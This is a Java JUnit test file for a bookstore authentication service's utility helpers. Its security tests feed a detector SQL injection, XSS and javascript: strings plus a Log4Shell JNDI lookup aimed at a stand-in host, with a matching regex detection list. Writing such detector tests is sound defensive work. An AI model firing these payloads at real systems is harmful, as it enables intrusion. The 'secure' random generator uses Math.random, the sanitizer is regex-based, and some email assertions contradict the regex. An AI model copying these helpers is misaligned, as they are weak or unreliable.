package com.bookstore.user_authentication_service.util;

import com.bookstore.user_authentication_service.entity.User;
import com.bookstore.user_authentication_service.entity.UserRole;
import com.bookstore.user_authentication_service.entity.AccountStatus;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.junit.jupiter.params.provider.NullAndEmptySource;

import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.regex.Pattern;

import static org.junit.jupiter.api.Assertions.*;

@DisplayName("Utility and Helper Class Tests")
class UtilityTest {

    @Nested
    @DisplayName("Validation Utility Tests")
    class ValidationUtilTests {

        @ParameterizedTest
        @ValueSource(strings = {
            "test@example.com",
            "user.name@domain.co.uk",
            "firstname+lastname@example.com",
            "email@123.123.123.123", // IP address
            "1234567890@example.com",
            "email@example-one.com",
            "_______@example.com",
            "email@example.name"
        })
        @DisplayName("Should validate correct email formats")
        void shouldValidateCorrectEmailFormats(String validEmail) {
            assertTrue(isValidEmail(validEmail), "Should accept valid email: " + validEmail);
        }

        @ParameterizedTest
        @ValueSource(strings = {
            "plainaddress",
            "@missingdomain.com",
            "missing-at-sign.net",
            "missing@.com",
            "missing@domain",
            "spaces @domain.com",
            "email@domain .com",
            "email..double.dot@example.com",
            "email@-example.com",
            "email@example-.com"
        })
        @DisplayName("Should reject invalid email formats")
        void shouldRejectInvalidEmailFormats(String invalidEmail) {
            assertFalse(isValidEmail(invalidEmail), "Should reject invalid email: " + invalidEmail);
        }

        @ParameterizedTest
        @NullAndEmptySource
        @DisplayName("Should handle null and empty emails")
        void shouldHandleNullAndEmptyEmails(String email) {
            assertFalse(isValidEmail(email), "Should reject null/empty email");
        }

        @ParameterizedTest
        @ValueSource(strings = {
            "1234567890",
            "+1234567890",
            "+91-9876543210",
            "(123) 456-7890",
            "123-456-7890",
            "123.456.7890",
            "+1 (123) 456-7890",
            "9876543210"
        })
        @DisplayName("Should validate correct phone formats")
        void shouldValidateCorrectPhoneFormats(String validPhone) {
            assertTrue(isValidPhone(validPhone), "Should accept valid phone: " + validPhone);
        }

        @ParameterizedTest
        @ValueSource(strings = {
            "123", // Too short
            "12345678901234567890", // Too long
            "abcdefghij", // Letters only
            "123-abc-456", // Mixed letters and numbers
            "++1234567890", // Double plus
            "123 456 789 012 345", // Too many spaces
            ""
        })
        @DisplayName("Should reject invalid phone formats")
        void shouldRejectInvalidPhoneFormats(String invalidPhone) {
            assertFalse(isValidPhone(invalidPhone), "Should reject invalid phone: " + invalidPhone);
        }

        @ParameterizedTest
        @ValueSource(strings = {
            "Password123!",
            "MySecure@Pass1",
            "Complex#Password9",
            "Strong$Pass2024",
            "Secure&Password1"
        })
        @DisplayName("Should validate strong passwords")
        void shouldValidateStrongPasswords(String strongPassword) {
            assertTrue(isStrongPassword(strongPassword), "Should accept strong password: " + strongPassword);
        }

        @ParameterizedTest
        @ValueSource(strings = {
            "weak", // Too short
            "password", // No uppercase, no numbers, no special chars
            "PASSWORD", // No lowercase, no numbers, no special chars
            "Password", // No numbers, no special chars
            "Password123", // No special chars
            "password123!", // No uppercase
            "PASSWORD123!", // No lowercase
            "Pass1!", // Too short
            "12345678!", // No letters
            "abcdefgh!", // No numbers, no uppercase
            "ABCDEFGH!" // No numbers, no lowercase
        })
        @DisplayName("Should reject weak passwords")
        void shouldRejectWeakPasswords(String weakPassword) {
            assertFalse(isStrongPassword(weakPassword), "Should reject weak password: " + weakPassword);
        }

        @Test
        @DisplayName("Should validate username format")
        void shouldValidateUsernameFormat() {
            // Valid usernames
            assertTrue(isValidUsername("user123"));
            assertTrue(isValidUsername("test_user"));
            assertTrue(isValidUsername("user.name"));
            assertTrue(isValidUsername("user-name"));
            assertTrue(isValidUsername("username"));
            assertTrue(isValidUsername("user123name"));

            // Invalid usernames
            assertFalse(isValidUsername("us")); // Too short
            assertFalse(isValidUsername("a".repeat(51))); // Too long
            assertFalse(isValidUsername("user name")); // Spaces
            assertFalse(isValidUsername("user@name")); // Special chars
            assertFalse(isValidUsername("user#name")); // Special chars
            assertFalse(isValidUsername("")); // Empty
            assertFalse(isValidUsername(null)); // Null
        }

        // Helper methods for validation (these would typically be in a utility class)
        private boolean isValidEmail(String email) {
            if (email == null || email.trim().isEmpty()) {
                return false;
            }
            String emailRegex = "^[a-zA-Z0-9_+&*-]+(?:\\.[a-zA-Z0-9_+&*-]+)*@" +
                               "(?:[a-zA-Z0-9-]+\\.)+[a-zA-Z]{2,7}$";
            return Pattern.compile(emailRegex).matcher(email).matches();
        }

        private boolean isValidPhone(String phone) {
            if (phone == null || phone.trim().isEmpty()) {
                return false;
            }
            // Remove all non-digit characters except +
            String cleanPhone = phone.replaceAll("[^+\\d]", "");
            // Should be 10-15 digits, optionally starting with +
            return cleanPhone.matches("^\\+?\\d{10,15}$");
        }

        private boolean isStrongPassword(String password) {
            if (password == null || password.length() < 8) {
                return false;
            }
            boolean hasUpper = password.matches(".*[A-Z].*");
            boolean hasLower = password.matches(".*[a-z].*");
            boolean hasDigit = password.matches(".*\\d.*");
            boolean hasSpecial = password.matches(".*[!@#$%^&*()_+\\-=\\[\\]{};':\"\\\\|,.<>\\/?].*");
            
            return hasUpper && hasLower && hasDigit && hasSpecial;
        }

        private boolean isValidUsername(String username) {
            if (username == null || username.trim().isEmpty()) {
                return false;
            }
            if (username.length() < 3 || username.length() > 50) {
                return false;
            }
            return username.matches("^[a-zA-Z0-9._-]+$");
        }
    }

    @Nested
    @DisplayName("Date Time Utility Tests")
    class DateTimeUtilTests {

        @Test
        @DisplayName("Should format dates correctly")
        void shouldFormatDatesCorrectly() {
            LocalDateTime testDate = LocalDateTime.of(2024, 1, 15, 14, 30, 45);
            
            assertEquals("2024-01-15", formatDate(testDate));
            assertEquals("14:30:45", formatTime(testDate));
            assertEquals("2024-01-15 14:30:45", formatDateTime(testDate));
            assertEquals("15 Jan 2024", formatDateHumanReadable(testDate));
        }

        @Test
        @DisplayName("Should handle timezone conversions")
        void shouldHandleTimezoneConversions() {
            LocalDateTime utcTime = LocalDateTime.of(2024, 1, 15, 12, 0, 0);
            
            // Test conversion to different timezones (simplified)
            assertNotNull(utcTime);
            assertTrue(utcTime.isBefore(LocalDateTime.now().plusDays(1)));
        }

        @Test
        @DisplayName("Should calculate expiration times correctly")
        void shouldCalculateExpirationTimesCorrectly() {
            LocalDateTime now = LocalDateTime.now();
            
            LocalDateTime accessTokenExpiry = calculateAccessTokenExpiry(now);
            LocalDateTime refreshTokenExpiry = calculateRefreshTokenExpiry(now);
            
            // Access token should expire in 24 hours
            assertTrue(accessTokenExpiry.isAfter(now.plusHours(23)));
            assertTrue(accessTokenExpiry.isBefore(now.plusHours(25)));
            
            // Refresh token should expire in 7 days
            assertTrue(refreshTokenExpiry.isAfter(now.plusDays(6)));
            assertTrue(refreshTokenExpiry.isBefore(now.plusDays(8)));
        }

        @Test
        @DisplayName("Should check if dates are expired")
        void shouldCheckIfDatesAreExpired() {
            LocalDateTime pastDate = LocalDateTime.now().minusHours(1);
            LocalDateTime futureDate = LocalDateTime.now().plusHours(1);
            
            assertTrue(isExpired(pastDate));
            assertFalse(isExpired(futureDate));
            assertFalse(isExpired(null)); // Null should not be considered expired
        }

        // Helper methods for date/time utilities
        private String formatDate(LocalDateTime dateTime) {
            return dateTime.format(DateTimeFormatter.ofPattern("yyyy-MM-dd"));
        }

        private String formatTime(LocalDateTime dateTime) {
            return dateTime.format(DateTimeFormatter.ofPattern("HH:mm:ss"));
        }

        private String formatDateTime(LocalDateTime dateTime) {
            return dateTime.format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss"));
        }

        private String formatDateHumanReadable(LocalDateTime dateTime) {
            return dateTime.format(DateTimeFormatter.ofPattern("dd MMM yyyy"));
        }

        private LocalDateTime calculateAccessTokenExpiry(LocalDateTime from) {
            return from.plusHours(24);
        }

        private LocalDateTime calculateRefreshTokenExpiry(LocalDateTime from) {
            return from.plusDays(7);
        }

        private boolean isExpired(LocalDateTime dateTime) {
            return dateTime != null && dateTime.isBefore(LocalDateTime.now());
        }
    }

    @Nested
    @DisplayName("String Utility Tests")
    class StringUtilTests {

        @Test
        @DisplayName("Should sanitize input strings")
        void shouldSanitizeInputStrings() {
            String maliciousInput = "<script>alert('xss')</script>";
            String sanitized = sanitizeInput(maliciousInput);
            
            assertFalse(sanitized.contains("<script>"));
            assertFalse(sanitized.contains("</script>"));
        }

        @Test
        @DisplayName("Should generate secure random strings")
        void shouldGenerateSecureRandomStrings() {
            String random1 = generateSecureRandomString(16);
            String random2 = generateSecureRandomString(16);
            
            assertEquals(16, random1.length());
            assertEquals(16, random2.length());
            assertNotEquals(random1, random2);
            assertTrue(random1.matches("[A-Za-z0-9]+"));
        }

        @Test
        @DisplayName("Should mask sensitive information")
        void shouldMaskSensitiveInformation() {
            assertEquals("test****@example.com", maskEmail("testuser@example.com"));
            assertEquals("*****43210", maskPhone("9876543210"));
            assertEquals("****", maskPassword("password123"));
        }

        @Test
        @DisplayName("Should handle null and empty strings safely")
        void shouldHandleNullAndEmptyStringsSafely() {
            assertNull(sanitizeInput(null));
            assertEquals("", sanitizeInput(""));
            
            assertNull(maskEmail(null));
            assertEquals("", maskEmail(""));
            
            assertNull(maskPhone(null));
            assertEquals("", maskPhone(""));
        }

        // Helper methods for string utilities
        private String sanitizeInput(String input) {
            if (input == null) return null;
            if (input.isEmpty()) return "";
            
            return input.replaceAll("<script.*?>.*?</script>", "")
                       .replaceAll("<.*?>", "")
                       .replaceAll("javascript:", "")
                       .replaceAll("on\\w+\\s*=", "");
        }

        private String generateSecureRandomString(int length) {
            String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            StringBuilder result = new StringBuilder();
            for (int i = 0; i < length; i++) {
                result.append(chars.charAt((int) (Math.random() * chars.length())));
            }
            return result.toString();
        }

        private String maskEmail(String email) {
            if (email == null) return null;
            if (email.isEmpty()) return "";
            
            int atIndex = email.indexOf('@');
            if (atIndex <= 0) return email;
            
            String username = email.substring(0, atIndex);
            String domain = email.substring(atIndex);
            
            if (username.length() <= 4) {
                return "*".repeat(username.length()) + domain;
            }
            
            return username.substring(0, 4) + "*".repeat(username.length() - 4) + domain;
        }

        private String maskPhone(String phone) {
            if (phone == null) return null;
            if (phone.isEmpty()) return "";
            
            if (phone.length() <= 5) {
                return "*".repeat(phone.length());
            }
            
            return "*".repeat(phone.length() - 5) + phone.substring(phone.length() - 5);
        }

        private String maskPassword(String password) {
            if (password == null) return null;
            return "*".repeat(Math.max(4, password.length()));
        }
    }

    @Nested
    @DisplayName("Security Utility Tests")
    class SecurityUtilTests {

        @Test
        @DisplayName("Should detect suspicious patterns")
        void shouldDetectSuspiciousPatterns() {
            assertTrue(isSuspiciousInput("'; DROP TABLE users; --"));
            assertTrue(isSuspiciousInput("<script>alert('xss')</script>"));
            assertTrue(isSuspiciousInput("javascript:alert('xss')"));
            assertTrue(isSuspiciousInput("${jndi:ldap://evil.com/a}"));
            
            assertFalse(isSuspiciousInput("normal user input"));
            assertFalse(isSuspiciousInput("user@example.com"));
            assertFalse(isSuspiciousInput("John Doe"));
        }

        @Test
        @DisplayName("Should validate IP addresses")
        void shouldValidateIpAddresses() {
            assertTrue(isValidIpAddress("192.168.1.1"));
            assertTrue(isValidIpAddress("10.0.0.1"));
            assertTrue(isValidIpAddress("127.0.0.1"));
            assertTrue(isValidIpAddress("255.255.255.255"));
            
            assertFalse(isValidIpAddress("256.1.1.1"));
            assertFalse(isValidIpAddress("192.168.1"));
            assertFalse(isValidIpAddress("not.an.ip.address"));
            assertFalse(isValidIpAddress(""));
            assertFalse(isValidIpAddress(null));
        }

        @Test
        @DisplayName("Should check for rate limiting")
        void shouldCheckForRateLimiting() {
            String ipAddress = "192.168.1.100";
            
            // Simulate multiple requests
            for (int i = 0; i < 5; i++) {
                assertFalse(isRateLimited(ipAddress));
            }
            
            // After many requests, should be rate limited
            for (int i = 0; i < 100; i++) {
                isRateLimited(ipAddress);
            }
            
            assertTrue(isRateLimited(ipAddress));
        }

        // Helper methods for security utilities
        private boolean isSuspiciousInput(String input) {
            if (input == null) return false;
            
            String[] suspiciousPatterns = {
                "(?i).*drop\\s+table.*",
                "(?i).*select\\s+.*from.*",
                "(?i).*insert\\s+into.*",
                "(?i).*delete\\s+from.*",
                "(?i).*<script.*",
                "(?i).*javascript:.*",
                "(?i).*\\$\\{jndi:.*",
                "(?i).*on\\w+\\s*=.*"
            };
            
            for (String pattern : suspiciousPatterns) {
                if (input.matches(pattern)) {
                    return true;
                }
            }
            
            return false;
        }

        private boolean isValidIpAddress(String ip) {
            if (ip == null || ip.isEmpty()) return false;
            
            String[] parts = ip.split("\\.");
            if (parts.length != 4) return false;
            
            try {
                for (String part : parts) {
                    int num = Integer.parseInt(part);
                    if (num < 0 || num > 255) return false;
                }
                return true;
            } catch (NumberFormatException e) {
                return false;
            }
        }

        // Simple rate limiting simulation (in real implementation, would use Redis or similar)
        private static int requestCount = 0;
        private boolean isRateLimited(String ipAddress) {
            requestCount++;
            return requestCount > 50; // Simple threshold
        }
    }

    @Nested
    @DisplayName("User Utility Tests")
    class UserUtilTests {

        @Test
        @DisplayName("Should calculate user profile completeness")
        void shouldCalculateUserProfileCompleteness() {
            User incompleteUser = User.builder()
                    .username("testuser")
                    .email("test@example.com")
                    .password("password")
                    .build();
            
            User completeUser = User.builder()
                    .username("testuser")
                    .email("test@example.com")
                    .password("password")
                    .fullName("Test User")
                    .mobileNumber("9876543210")
                    .dateOfBirth(LocalDateTime.now().minusYears(25).toLocalDate())
                    .bio("Test bio")
                    .profilePictureUrl("http://example.com/pic.jpg")
                    .build();
            
            double incompleteScore = calculateProfileCompleteness(incompleteUser);
            double completeScore = calculateProfileCompleteness(completeUser);
            
            assertTrue(incompleteScore < completeScore);
            assertTrue(completeScore > 80.0); // Should be high for complete profile
            assertTrue(incompleteScore < 50.0); // Should be low for incomplete profile
        }

        @Test
        @DisplayName("Should determine user display name")
        void shouldDetermineUserDisplayName() {
            User userWithFullName = User.builder()
                    .username("testuser")
                    .fullName("John Doe")
                    .build();
            
            User userWithoutFullName = User.builder()
                    .username("testuser")
                    .build();
            
            assertEquals("John Doe", getDisplayName(userWithFullName));
            assertEquals("testuser", getDisplayName(userWithoutFullName));
        }

        @Test
        @DisplayName("Should check user permissions")
        void shouldCheckUserPermissions() {
            User adminUser = User.builder()
                    .userRole(UserRole.ADMIN)
                    .build();
            
            User customerUser = User.builder()
                    .userRole(UserRole.CUSTOMER)
                    .build();
            
            assertTrue(hasAdminPrivileges(adminUser));
            assertFalse(hasAdminPrivileges(customerUser));
            
            assertTrue(canAccessAdminPanel(adminUser));
            assertFalse(canAccessAdminPanel(customerUser));
        }

        // Helper methods for user utilities
        private double calculateProfileCompleteness(User user) {
            int totalFields = 8;
            int completedFields = 0;
            
            if (user.getUsername() != null && !user.getUsername().isEmpty()) completedFields++;
            if (user.getEmail() != null && !user.getEmail().isEmpty()) completedFields++;
            if (user.getPassword() != null && !user.getPassword().isEmpty()) completedFields++;
            if (user.getFullName() != null && !user.getFullName().isEmpty()) completedFields++;
            if (user.getMobileNumber() != null && !user.getMobileNumber().isEmpty()) completedFields++;
            if (user.getDateOfBirth() != null) completedFields++;
            if (user.getBio() != null && !user.getBio().isEmpty()) completedFields++;
            if (user.getProfilePictureUrl() != null && !user.getProfilePictureUrl().isEmpty()) completedFields++;
            
            return (completedFields * 100.0) / totalFields;
        }

        private String getDisplayName(User user) {
            if (user.getFullName() != null && !user.getFullName().trim().isEmpty()) {
                return user.getFullName();
            }
            return user.getUsername();
        }

        private boolean hasAdminPrivileges(User user) {
            return user.getUserRole() == UserRole.ADMIN || 
                   user.getUserRole() == UserRole.SUPER_ADMIN ||
                   user.getUserRole() == UserRole.MANAGER;
        }

        private boolean canAccessAdminPanel(User user) {
            return hasAdminPrivileges(user) && user.getAccountStatus() == AccountStatus.ACTIVE;
        }
    }
}
